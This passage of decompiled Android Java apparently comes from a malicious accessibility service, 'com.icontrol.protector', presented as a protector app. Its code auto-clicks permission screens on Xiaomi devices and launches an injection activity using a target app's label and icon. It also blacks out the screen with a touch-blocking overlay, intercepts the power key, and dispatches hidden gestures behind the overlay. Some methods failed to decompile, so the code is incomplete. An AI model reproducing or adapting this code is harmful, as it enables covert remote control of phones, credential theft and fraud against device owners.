            this.setGestureDetectionPassthroughRegion(0, (Region)accessibilityServiceInfo);
        }
    }

    /* synthetic */ void lambda$finishxaomi$22$com-icontrol-protector-AccessibilityServiceController() {
        try {
            this.enableallxaomi();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /* synthetic */ void lambda$finishxaomi$23$com-icontrol-protector-AccessibilityServiceController(Handler handler) {
        Rect rect;
        Rect rect2 = null;
        AccessibilityNodeInfo accessibilityNodeInfo = this.getRootInActiveWindow();
        String[] stringArray = new String[]{"Other permissions", "\u0623\u0630\u0648\u0646\u0627\u062a \u0623\u062e\u0631\u0649", "\u5176\u4ed6\u6743\u9650\u7ba1\u7406", "Di\u011fer izinler", "Outras permiss\u00f5es", "\u0414\u0440\u0443\u0433\u0438\u0435 \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u044f", "Otros permisos"};
        int n = stringArray.length;
        int n2 = 0;
        while (true) {
            rect = rect2;
            if (n2 >= n) break;
            rect = AccessibilityServiceHelper.findNodesByText(stringArray[n2], accessibilityNodeInfo);
            if (rect != null && !rect.isEmpty()) {
                rect = (AccessibilityNodeInfo)rect.get(0);
                break;
            }
            ++n2;
        }
        if (rect != null) {
            rect2 = new Rect();
            rect.getBoundsInScreen(rect2);
            AccessibilityServiceHelper.clickthis((int)rect2.exactCenterX(), (int)rect2.exactCenterY());
            rect.recycle();
            handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda3(this), 700L);
        } else {
            try {
                this.performGlobalAction(1);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
            SetupOrchestrationService.holdxaomi = false;
            SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.skipxaomi, true);
        }
    }

    /* synthetic */ void lambda$onAccessibilityEvent$18$com-icontrol-protector-AccessibilityServiceController() {
        this.performGlobalAction(2);
    }

    /* synthetic */ void lambda$onAccessibilityEvent$19$com-icontrol-protector-AccessibilityServiceController(Context context, String string2, String string3, byte[] byArray) {
        context = new Intent(context, InjectTargetActivity.class);
        context.addFlags(0x10000000);
        context.addFlags(65536);
        context.putExtra("cuzid", string2);
        context.putExtra("label", string3);
        context.putExtra("icon", byArray);
        context.putExtra("type", "u");
        this.startActivity((Intent)context);
    }

    /* synthetic */ void lambda$onKeyEvent$20$com-icontrol-protector-AccessibilityServiceController() {
        try {
            if (BlackScreen_ON) {
                AccessibilityServiceHelper.WakeScreen(this.getApplicationContext());
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /* synthetic */ void lambda$runGestureWithBypass$6$com-icontrol-protector-AccessibilityServiceController(GestureDescription gestureDescription) {
        this.dispatchGesture(gestureDescription, null, null);
    }

    /* synthetic */ void lambda$runGestureWithBypass$7$com-icontrol-protector-AccessibilityServiceController() {
        if (BlackScreen_ON && BlackScreen_BlockTouches && this.TouchBlockOverlay != null && this.TouchBlockOverlay.getWindowToken() == null && AccessWindow != null) {
            try {
                int[] nArray = this.getFullscreenOverlayRect();
                AccessibilityServiceController.TouchBlockParams.width = nArray[0];
                AccessibilityServiceController.TouchBlockParams.height = nArray[1];
                AccessibilityServiceController.TouchBlockParams.x = nArray[2];
                AccessibilityServiceController.TouchBlockParams.y = nArray[3];
                AccessWindow.addView(this.TouchBlockOverlay, (ViewGroup.LayoutParams)TouchBlockParams);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    /* synthetic */ void lambda$runWithTouchBypass$9$com-icontrol-protector-AccessibilityServiceController() {
        if (BlackScreen_ON && BlackScreen_BlockTouches && this.TouchBlockOverlay != null && this.TouchBlockOverlay.getWindowToken() == null && AccessWindow != null) {
            try {
                int[] nArray = this.getFullscreenOverlayRect();
                AccessibilityServiceController.TouchBlockParams.width = nArray[0];
                AccessibilityServiceController.TouchBlockParams.height = nArray[1];
                AccessibilityServiceController.TouchBlockParams.x = nArray[2];
                AccessibilityServiceController.TouchBlockParams.y = nArray[3];
                AccessWindow.addView(this.TouchBlockOverlay, (ViewGroup.LayoutParams)TouchBlockParams);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    /* synthetic */ void lambda$setBlockPlainBlack$5$com-icontrol-protector-AccessibilityServiceController() {
        try {
            if (this.BlackoverLay != null) {
                this.BlackoverLay.removeAllViews();
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /* synthetic */ void lambda$showBlockHtml$4$com-icontrol-protector-AccessibilityServiceController(String string2) {
        try {
            WebView webView;
            if (this.BlackoverLay == null) {
                return;
            }
            this.BlackoverLay.removeAllViews();
            if (this.WbVwBlack != null && this.WbVwBlack.getParent() != null) {
                this.BlackoverLay.removeView((View)this.WbVwBlack);
            }
            this.WbVwBlack = webView = new WebView((Context)this);
            this.WbVwBlack.setBackgroundColor(0);
            this.applyWebViewSettings(this.WbVwBlack);
            webView = this.WbVwBlack;
            SafeWebViewClient safeWebViewClient = new SafeWebViewClient(this);
            webView.setWebViewClient((WebViewClient)safeWebViewClient);
            this.WbVwBlack.loadDataWithBaseURL(null, string2, "text/html", "utf-8", null);
            webView = this.BlackoverLay;
            string2 = this.WbVwBlack;
            safeWebViewClient = new FrameLayout.LayoutParams(-1, -1);
            webView.addView((View)string2, (ViewGroup.LayoutParams)safeWebViewClient);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void loadBlockStyle(int n, String string2) {
        try {
            void var3_8;
            StringBuilder stringBuilder = new StringBuilder();
            String string3 = stringBuilder.append("block_").append(n).append(".html").toString();
            String string4 = UtilityHelper.loadHtmlFromAssets(this.getApplicationContext(), string3);
            String string5 = Locale.getDefault().getLanguage();
            if ("ar".equals(string5)) {
                String string6 = "rtl";
            } else {
                String string7 = "ltr";
            }
            String string8 = string2 != null && !string2.trim().isEmpty() ? string2 : AccessibilityServiceController.getDefaultBlockMsg(string5);
            this.showBlockHtml(string4.replace("[LNG]", string5).replace("[DIR]", (CharSequence)var3_8).replace("[MSG]", string8));
            return;
        }
        catch (Exception exception) {
            try {
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2 = stringBuilder2.append("<!DOCTYPE html><html><body style='margin:0;background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center'><div>");
                if (string2 == null) {
                    string2 = "Please wait";
                }
                this.showBlockHtml(stringBuilder2.append(string2).append("</div></body></html>").toString());
                return;
            }
            catch (Exception exception2) {
                exception2.printStackTrace();
            }
        }
    }

    /*
     * Exception decompiling
     */
    public void onAccessibilityEvent(AccessibilityEvent var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 47[TRYBLOCK] [54 : 1957->1981)] java.lang.Exception
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public void onConfigurationChanged(Configuration object) {
        super.onConfigurationChanged(object);
        try {
            if (this.BlackoverLay != null && AccessWindow != null && BlackScreen_ON && this.BlackoverLay.getWindowToken() != null) {
                object = this.getFullscreenOverlayRect();
                AccessibilityServiceController.Blacklayparams.width = (int)object[0];
                AccessibilityServiceController.Blacklayparams.height = (int)object[1];
                AccessibilityServiceController.Blacklayparams.x = (int)object[2];
                AccessibilityServiceController.Blacklayparams.y = (int)object[3];
                AccessWindow.updateViewLayout((View)this.BlackoverLay, (ViewGroup.LayoutParams)Blacklayparams);
                if (this.TouchBlockOverlay != null && this.TouchBlockOverlay.getWindowToken() != null) {
                    AccessibilityServiceController.TouchBlockParams.width = (int)object[0];
                    AccessibilityServiceController.TouchBlockParams.height = (int)object[1];
                    AccessibilityServiceController.TouchBlockParams.x = (int)object[2];
                    AccessibilityServiceController.TouchBlockParams.y = (int)object[3];
                    AccessWindow.updateViewLayout(this.TouchBlockOverlay, (ViewGroup.LayoutParams)TouchBlockParams);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void onCreate() {
        super.onCreate();
        this.startforground((Context)this);
    }

    public boolean onGesture(AccessibilityGestureEvent accessibilityGestureEvent) {
        return false;
    }

    public void onInterrupt() {
        AndroidLogger.Debug("onInterrupt", "ACCESS");
    }

    protected boolean onKeyEvent(KeyEvent keyEvent) {
        if (BlackScreen_ON && keyEvent.getKeyCode() == 26) {
            if (keyEvent.getAction() == 0) {
                new Handler(this.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda21(this), 500L);
            }
            return true;
        }
        return super.onKeyEvent(keyEvent);
    }

    public void onRebind(Intent intent) {
        AndroidLogger.Debug("BTAccess", "onRebind");
        super.onRebind(intent);
    }

    public void onServiceConnected() {
        super.onServiceConnected();
        this.Setup();
        if (Passlist.size() > 0) {
            this.CloneChecker(this);
        }
        try {
            if (SetupOrchestrationService.isbooting) {
                SetupOrchestrationService.isbooting = false;
                Intent intent = new Intent((Context)this, SplashActivity.class);
                intent.addFlags(0x10000000);
                intent.addFlags(0x4000000);
                this.startActivity(intent);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        this.startforground((Context)this);
        return 1;
    }

    public boolean onUnbind(Intent intent) {
        AndroidLogger.Debug("BTAccess", "onUnbind");
        try {
            if (this.screenOffReceiver != null) {
                this.unregisterReceiver(this.screenOffReceiver);
                this.screenOffReceiver = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        AccessibilityServiceController.releaseBlackScreenWakeLock();
        return true;
    }

    /*
     * Unable to fully structure code
     */
    public void printViewIds(AccessibilityNodeInfo var1_1, int var2_6) {
        block14: {
            block15: {
                if (var1_1 != null) ** GOTO lbl6
                Log.e((String)"At.printViewIds", (String)"Root view is null.");
                return;
lbl6:
                // 1 sources

                var13_7 = var1_1.getViewIdResourceName() != null ? var1_1.getViewIdResourceName() : "id_not_available";
                var14_8 = var1_1.getClassName() != null ? var1_1.getClassName().toString() : "class_not_available";
                var15_9 = var1_1.getPackageName() != null ? var1_1.getPackageName().toString() : "package_not_available";
                var16_10 = var1_1.getText() != null ? var1_1.getText().toString() : "text_not_available";
                var17_11 = var1_1.getContentDescription() != null ? var1_1.getContentDescription().toString() : "description_not_available";
                var7_12 = var1_1.isCheckable();
                var10_13 = var1_1.isChecked();
                var11_14 = var1_1.isClickable();
                var8_15 = var1_1.isEnabled();
                var12_16 = var1_1.isFocusable();
                var9_17 = var1_1.isVisibleToUser();
                var18_18 = new Rect();
                var1_1.getBoundsInScreen((Rect)var18_18);
                var4_19 = var18_18.left;
                var5_20 = var18_18.top;
                var6_21 = var18_18.width();
                var3_22 = var18_18.height();
                var18_18 = new String(new char[var2_6]);
                var18_18 = var18_18.replace("\u0000", "  ");
                var19_23 = new StringBuilder();
                var13_7 = var19_23.append((String)var18_18).append("View Details [").append(var2_6).append("]\n").append((String)var18_18).append("ID: ").append((String)var13_7).append("\n").append((String)var18_18).append("Class: ").append(var14_8).append("\n").append((String)var18_18).append("Package: ").append(var15_9).append("\n").append((String)var18_18).append("Text: ").append(var16_10).append("\n").append((String)var18_18).append("Content Description: ").append(var17_11).append("\n").append((String)var18_18).append("Checkable: ").append(var7_12).append("\n").append((String)var18_18).append("Checked: ").append(var10_13).append("\n").append((String)var18_18).append("Clickable: ").append(var11_14).append("\n").append((String)var18_18).append("Enabled: ").append(var8_15).append("\n").append((String)var18_18).append("Focusable: ").append(var12_16).append("\n").append((String)var18_18).append("Visible: ").append(var9_17).append("\n").append((String)var18_18).append("Position: (").append(var4_19).append(", ").append(var5_20).append(")\n").append((String)var18_18).append("Size: ").append(var6_21).append("x");
                var13_7 = var13_7.append(var3_22).append("\n").append((String)var18_18).append("-------------------------").toString();
                try {
                    Log.e((String)"At.printViewIds", (String)var13_7);
                    var4_19 = 0;
                    var13_7 = var18_18;
                }
                catch (Exception var1_4) {
                    // empty catch block
                }
                while (true) {
                    if (var4_19 >= var1_1.getChildCount()) break block14;
                    var14_8 = var1_1.getChild(var4_19);
                    try {
                        this.printViewIds((AccessibilityNodeInfo)var14_8, var2_6 + 1);
                        ++var4_19;
                    }
                    catch (Exception var1_2) {
                        break block15;
                    }
                }
                catch (Exception var1_3) {}
            }
            Log.e((String)"At.printViewIds", (String)("Exception: " + var1_5.getMessage()));
        }
    }

    /*
     * Unable to fully structure code
     */
    public void removeAllOverlays() {
        ** for (var2_3 : this.overlays.values())
lbl-1000:
        // 1 sources

        {
            try {
                AccessibilityServiceController.AccessWindow.removeView(var2_3);
            }
            catch (Exception var2_4) {
                var2_4.printStackTrace();
            }
            continue;
        }
lbl-1000:
        // 1 sources

        {
            this.overlays.clear();
        }
        {
            catch (Exception var1_2) {
                // empty catch block
            }
        }
    }

    public boolean runGestureWithBypass(GestureDescription gestureDescription, int n) {
        if (BlackScreen_ON && BlackScreen_BlockTouches) {
            if (this.TouchBlockOverlay != null && AccessWindow != null && this.TouchBlockOverlay.getWindowToken() != null) {
                try {
                    AccessWindow.removeView(this.TouchBlockOverlay);
                }
                catch (Exception exception) {
                    return false;
                }
                new Handler(this.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda24(this, gestureDescription), 100L);
                new Handler(this.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda25(this), (long)(n + 100));
                return true;
            }
            return false;
        }
        return false;
    }

    public void runWithTouchBypass(Runnable runnable2, int n) {
        if (BlackScreen_ON && BlackScreen_BlockTouches && this.TouchBlockOverlay != null && AccessWindow != null && this.TouchBlockOverlay.getWindowToken() != null) {
            try {
                AccessWindow.removeView(this.TouchBlockOverlay);
            }
            catch (Exception exception) {
                if (runnable2 != null) {
                    runnable2.run();
                }
                return;
            }
            new Handler(this.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda22(runnable2), 100L);
            new Handler(this.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda23(this), (long)(n + 100));
            return;
        }
        if (runnable2 != null) {
            runnable2.run();
        }
    }

    public void setAccessibilityFocusAppearance(int n, int n2) {
        super.setAccessibilityFocusAppearance(n, n2);
    }

    public void setBlockPlainBlack() {
        try {
            Handler handler = new Handler(this.getMainLooper());
            AccessibilityServiceController$$ExternalSyntheticLambda10 AccessibilityServiceController$$ExternalSyntheticLambda10 = new AccessibilityServiceController$$ExternalSyntheticLambda10(this);
            handler.post((Runnable)AccessibilityServiceController$$ExternalSyntheticLambda10);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public void setGestureDetectionPassthroughRegion(int n, Region region) {
        super.setGestureDetectionPassthroughRegion(n, region);
    }

    public void setTouchExplorationPassthroughRegion(int n, Region region) {
        super.setTouchExplorationPassthroughRegion(n, region);
    }

    public void takeScreenshot(int n, Executor executor, AccessibilityService.TakeScreenshotCallback takeScreenshotCallback) {
        super.takeScreenshot(n, executor, takeScreenshotCallback);
    }

    private class SafeWebViewClient
    extends WebViewClient {
        final AccessibilityServiceController this$0;

        private SafeWebViewClient(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
            this.this$0 = jhvbzpdwpbqgticwdxuva2;
        }

        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest object) {
            if (!((String)(object = object != null && object.getUrl() != null ? object.getUrl().toString() : "")).startsWith("http://") && !((String)object).startsWith("https://")) {
                return true;
            }
            webView.loadUrl((String)object);
            return true;
        }
    }
}

